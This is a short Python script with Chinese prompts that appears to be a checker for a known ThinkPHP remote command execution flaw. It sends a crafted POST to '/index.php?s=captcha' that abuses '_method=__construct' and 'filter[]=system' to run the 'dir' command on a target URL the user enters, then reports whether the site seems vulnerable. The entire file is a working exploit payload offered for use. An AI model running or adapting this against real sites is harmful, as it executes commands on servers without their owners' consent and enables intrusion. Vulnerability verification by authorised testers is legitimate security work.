import requests
import colorama

def main():
    url=input("请输入需要验证的url:")
    if url.lower()=='exit':
          return None
    else:
          pass
    command='dir'
    file = '/index.php?s=captcha'
    print(colorama.Fore.YELLOW+"[+]验证......"+colorama.Style.RESET_ALL)
    data = {
        '_method': '__construct',
        'filter[]': 'system',
        'method': 'get',
        'server[REQUEST_METHOD]': f'{command}'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0'
    }
    
    # 拼接 URL
    full_url = url.rstrip('/') + file
    #print(f"Full URL: {full_url}")

    


    # 发送 POST 请求
    response = requests.post(full_url, data=data, headers=headers)
    
    # 打印响应内容
    print("Response Text:")
    response_list=(response.text.splitlines())
    if '.php' in response_list[0]:
            print(colorama.Fore.GREEN+"[+]似乎存在远程命令执行漏洞。"+colorama.Style.RESET_ALL)
    else:
         print(colorama.Fore.RED+"[-]似乎不存在远程命令执行漏洞"+colorama.Style.RESET_ALL)

